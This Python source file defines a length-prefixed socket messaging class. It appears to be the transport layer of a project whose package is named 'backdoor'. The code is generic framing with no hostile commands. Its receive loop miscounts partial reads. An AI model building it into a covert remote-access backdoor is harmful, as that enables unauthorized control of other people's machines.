from socket import socket

from backdoor.messages.exceptions import DisconnectedException


class SocketProtocol:

    def __init__(self, bufsize: int = 1024, paddingsize: int = 1024) -> None:
        self.bufsize = bufsize
        self.paddingsize = paddingsize

    def read(self, socket: socket) -> bytes:
        try:
            payload = self.__try_read(socket)
        except ValueError:
            raise DisconnectedException
        else:
            if len(payload) == 0:
                raise DisconnectedException
        return payload

    def send(self, socket: socket, payload: bytes) -> None:
        try:
            self.__try_send(socket, payload)
        except BrokenPipeError:
            raise DisconnectedException

    def __try_send(self, socket: socket, payload: bytes) -> None:
        size = len(payload)
        self.__send_size(socket, size)
        self.__send_payload(socket, payload)

    def __try_read(self, socket: socket) -> bytes:
        size = self.__recv_size(socket)
        return self.__recv_payload(socket, size)

    def __recv_size(self, socket: socket) -> int:
        return int(socket.recv(self.paddingsize))

    def __recv_payload(self, socket: socket, size: int) -> bytes:
        buf = bytearray()
        while size > 0:
            next_read_size = min(size, self.bufsize)
            chunk = socket.recv(next_read_size)
            buf.extend(chunk)
            size -= next_read_size
        return bytes(buf)

    def __send_size(self, socket: socket, size: int) -> None:
        padded_size = str(size).encode().zfill(self.paddingsize)
        socket.send(padded_size)

    def __send_payload(self, socket: socket, payload: bytes) -> None:
        socket.send(payload)
